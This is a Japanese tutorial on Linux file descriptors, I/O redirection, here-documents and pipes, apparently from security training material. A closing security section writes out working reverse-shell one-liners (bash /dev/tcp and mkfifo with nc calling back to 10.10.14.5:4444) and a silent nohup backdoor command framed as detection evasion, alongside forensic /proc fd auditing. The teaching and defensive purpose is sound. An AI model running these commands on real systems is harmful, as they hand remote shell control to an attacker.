## 重要な用語

この教材でよく出てくる言葉である。

| 用語 | 意味 |
|:---|:---|
| ファイルディスクリプタ | OSが開いているストリームを管理するために使う番号 |
| stdin (0) | 標準入力。プログラムが読み込む先 |
| stdout (1) | 標準出力。通常の結果 |
| stderr (2) | 標準エラー。エラーメッセージ。結果とは分けられている |
| `>` / `>>` | 出力をファイルへ送る(上書き / 追記) |
| `<` | ファイルから入力を取る |
| パイプ(`\|`) | あるプログラムの出力を次のプログラムへ流す |
| `/dev/null` | 書き込まれたものをすべて捨てる「ブラックホール」 |

## 1. ファイルディスクリプタ(FD)

ファイルディスクリプタ(FD)は、Linux カーネルが Input/Output(I/O)操作を識別・管理するために保持する参照番号です。開いているファイル、ソケット、I/O リソースにはそれぞれ一意の番号(FD)が割り当てられます。

FD はクロークの預かり番号票のようなものと考えてください。

- 番号票がファイルディスクリプタ
- 預けるコートがファイルやリソース
- 係員がオペレーティングシステム

番号票がなければ、OS はどのリソースにアクセスすべきか分かりません。Windows ではこの概念をファイルハンドルと呼びます。

### Linux のデフォルトファイルディスクリプタ

| FD | 名前 | ストリーム | 説明 |
|----|------|--------|-------------|
| `0` | STDIN | 入力 | 標準入力、キーボードやファイルからの入力 |
| `1` | STDOUT | 出力 | 標準出力、プログラムの通常の出力 |
| `2` | STDERR | 出力 | 標準エラー、エラーメッセージ専用 |

```
┌─────────────────────────────────────────┐
│              Linux Process              │
│                                         │
│  [FD 0 - STDIN]  ──►  Program Input    │
│  [FD 1 - STDOUT] ◄──  Normal Output    │
│  [FD 2 - STDERR] ◄──  Error Output     │
└─────────────────────────────────────────┘
```

## 2. STDIN と STDOUT

`cat` を実行すると、プログラムに標準入力(STDIN、FD 0)を渡していることになります。`[ENTER]` を押すと、そのテキストは標準出力(STDOUT、FD 1)としてターミナルに返されます。

```bash
$ cat
SOME INPUT        # ← STDIN (FD 0) — what you type
SOME INPUT        # ← STDOUT (FD 1) — echoed back
```

## 3. STDOUT と STDERR

`find` コマンドは同時に2種類の出力を生成します。

- STDOUT(FD 1)、正常に見つかった結果(緑)
- STDERR(FD 2)、"Permission denied" のエラーメッセージ(赤)

エラーを隠したい場合は、STDERR を `/dev/null` にリダイレクトします。これは送られたデータをすべて破棄する「ブラックホール」デバイスです。

```bash
# Show both STDOUT and STDERR
$ find /etc/ -name shadow
/etc/shadow
find: '/etc/ssl/private': Permission denied

# Redirect STDERR to /dev/null (suppress errors)
$ find /etc/ -name shadow 2>/dev/null
/etc/shadow
```

> `2>` は「FD 2(STDERR)を指定した出力先にリダイレクトする」という意味です。

## 4. STDOUT をファイルへリダイレクト

`>` を使うと STDOUT をファイルに保存できます。ファイルが存在しなければ自動的に作成され、既に存在する場合は確認なしで上書きされます。

```bash
$ find /etc/ -name shadow 2>/dev/null > results.txt
$ cat results.txt
/etc/shadow
```

```
find command
    │
    ├──── STDERR (FD 2) ──► /dev/null  (discarded)
    │
    └──── STDOUT (FD 1) ──► results.txt  (saved)
```

---

## 5. STDOUT と STDERR を別々のファイルへリダイレクト

STDOUT と STDERR を同時に別々のファイルへ送ることもできます。デバッグの際に便利で、通常の出力とエラーを分けて解析できます。

```bash
$ find /etc/ -name shadow 2> stderr.txt 1> stdout.txt

$ cat stdout.txt
/etc/shadow

$ cat stderr.txt
find: '/etc/ssl/private': Permission denied
find: '/etc/polkit-1/rules.d': Permission denied
```

```
find command
    │
    ├──── STDERR (FD 2) ──► stderr.txt
    │
    └──── STDOUT (FD 1) ──► stdout.txt
```

## 6. STDIN のリダイレクト

`<` はファイルの内容をコマンドの STDIN として渡すための演算子です。向きは `>` と逆で、データはファイルからプログラムへ流れます。

`>` と `<` はデータがどちらへ流れるかを示す矢印だと考えると理解しやすいです。

```bash
$ cat < stdout.txt
/etc/shadow
```

```
stdout.txt ──► (FD 0 - STDIN) ──► cat ──► terminal output
```

---

## 7. STDOUT の追記(`>>`)

`>>`(不等号2つ)は既存ファイルの末尾に出力を追記し、既存の内容を消しません。これは古い内容を消去してしまう `>` とは異なります。

| 演算子 | 動作 |
|----------|------|
| `>` | ファイルを上書き |
| `>>` | 末尾に追記 |

```bash
$ find /etc/ -name passwd >> stdout.txt 2>/dev/null
$ cat stdout.txt
/etc/shadow          # ← existing content
/etc/pam.d/passwd    # ← appended
/etc/cron.daily/passwd
/etc/passwd
```

---

## 8. STDIN ストリームをファイルへ(`<<` / ヒアドキュメント)

`<<`(不等号2つ、逆向き)はターミナルからの入力を直接ファイルへストリームします。これをヒアドキュメントと呼びます。入力の終端マーカー(通常は `EOF`、End Of File)を定義し、`EOF` より前に入力されたすべてのテキストが入力として扱われます。

```bash
$ cat << EOF > stream.txt
> Zero2Root
> EOF

$ cat stream.txt
Zero2Root
```

> `EOF` は単なる慣習で、終端マーカーには任意の語(`END`、`STOP`、`DONE` など)を使えます。

## 9. パイプ(`|`)

パイプ(`|`)は、あるコマンドの出力を次のコマンドの入力として接続します。一時ファイルにデータを保存することなく、強力なコマンドチェーンを組み立てられます。

パイプは何度でも連結できます。最初のコマンドの出力が2番目の入力になり、その出力がさらに3番目の入力になる、という具合です。

```bash
# Single pipe: find .conf files and filter for "systemd"
$ find /etc/ -name *.conf 2>/dev/null | grep systemd
/etc/systemd/system.conf
/etc/systemd/timesyncd.conf
/etc/systemd/journald.conf
/etc/systemd/user.conf
/etc/systemd/logind.conf
/etc/systemd/resolved.conf

# Chained pipes: add wc to count results
$ find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
6
```

パイプラインの流れ:
```
[find /etc/ -name *.conf]
          │  STDOUT
          ▼
    [grep systemd]          ← filters only "systemd" lines
          │  STDOUT
          ▼
        [wc -l]             ← counts the remaining lines
          │
          ▼
          6
```

## リダイレクト演算子クイックリファレンス

| 演算子 | 名前 | 説明 |
|----------|------|-------------|
| `>` | STDOUT リダイレクト | 出力をファイルに書き込む(上書き) |
| `>>` | STDOUT 追記 | 出力をファイルに追記 |
| `<` | STDIN リダイレクト | ファイルから入力を読み込む |
| `<<` | ヒアドキュメント | 複数行の入力をストリーム |
| `2>` | STDERR リダイレクト | エラーをファイルに書き込む |
| `2>/dev/null` | STDERR 抑制 | すべてのエラーメッセージを破棄 |
| `1>` | 明示的な STDOUT | STDOUT をファイルへ(`>` と同じ) |
| `2>&1` | STDERR→STDOUT 統合 | エラーストリームを出力ストリームに統合 |
| `\|` | パイプ | STDOUT を次のコマンドの STDIN へ渡す |

---

## パイプラインの完全な例

```bash
# Find all .conf files, filter for "systemd", count results
$ find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
6
```

```
find /etc/ -name *.conf
    │
    ├── STDERR ──► /dev/null      (errors suppressed)
    │
    └── STDOUT ──► grep systemd   (filter results)
                        │
                        └── STDOUT ──► wc -l   (count lines)
                                          │
                                          └──► 6
```

## ファイルディスクリプタの流れのまとめ

```
                  ┌──────────────────┐
  Keyboard ──────►│  FD 0 (STDIN)    │
                  │                  │
                  │     PROCESS      │
                  │                  │
  Terminal ◄──────│  FD 1 (STDOUT)   │
                  │                  │
  Terminal ◄──────│  FD 2 (STDERR)   │
                  └──────────────────┘

Redirection changes where these streams go:
  STDIN  (0) : keyboard → file (<) or here-doc (<<)
  STDOUT (1) : terminal → file (>) or append (>>)
  STDERR (2) : terminal → file (2>) or /dev/null (suppress)
```

## 10. セキュリティノート: リバースシェル、ファイルディスクリプタの乗っ取り、検知回避

ファイルディスクリプタ(FD)と I/O リダイレクトを深く理解することは、Linux におけるリバースシェルやステルス実行技術の土台になります。

1. bash リバースシェルの仕組み(`bash -i >& /dev/tcp/IP/PORT 0>&1`):
   - `bash -i`: 対話型シェルのインスタンスを起動する。
   - `>& /dev/tcp/IP/PORT`: STDOUT(FD 1)と STDERR(FD 2)の両方を、ターゲット先の TCP ソケットへリダイレクトする。
   - `0>&1`: STDIN(FD 0)を STDOUT(FD 1)から複製し、攻撃者がソケット経由で送るコマンドをシェルの入力として読み込ませる。
2. 名前付きパイプ / FIFO リバースシェル(`mkfifo`): `/dev/tcp` 疑似デバイスが無効化された Bash ビルドで、専用のパイプファイル(`mkfifo /tmp/f`)を使って双方向の通信チャネルを構築する手法。
3. 検知回避と出力抑制(`>/dev/null 2>&1`): STDOUT と STDERR を同時に `/dev/null` へ送り、ペイロードやスキャンスクリプトを被害者のターミナルに痕跡を残さず静かに実行する。
4. `/proc/<PID>/fd/` によるプロセスフォレンジクス: セキュリティ監査担当者は `/proc/<PID>/fd/` フォルダを調べることで、不審なプロセスが持つすべてのソケット接続、開いているファイル、稼働中の通信パイプを確認できる。

```bash
# ── REVERSE SHELL ONE-LINERS (FD EXPLOITATION) ───────────────

# 1. Native Bash /dev/tcp reverse shell
$ bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# 2. Named pipe (FIFO) reverse shell
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# 3. Silent background persistence script
$ nohup ./backdoor.sh >/dev/null 2>&1 &

# ── FORENSIC FD AUDITING ─────────────────────────────────────
# List all active descriptors of process PID 1337
$ ls -la /proc/1337/fd/
# lrwx------ 1 root root 64 0 -> /dev/pts/0
# lrwx------ 1 root root 64 1 -> socket:[28491]
# lrwx------ 1 root root 64 2 -> socket:[28491]
# lrwx------ 1 root root 64 3 -> /etc/shadow
```

## クイックリファレンス

```bash
# Suppress errors
command 2>/dev/null

# Save output to file (overwrite)
command > output.txt

# Save output to file (append)
command >> output.txt

# Save STDOUT and STDERR separately
command 1> stdout.txt 2> stderr.txt

# Merge STDERR into STDOUT
command > output.txt 2>&1

# Read file as STDIN
command < input.txt

# Here-document (multi-line stdin)
command << EOF
line one
line two
EOF

# Pipe output to next command
command1 | command2 | command3

# Practical pipeline
find /etc/ -name *.conf 2>/dev/null | grep systemd | wc -l
```
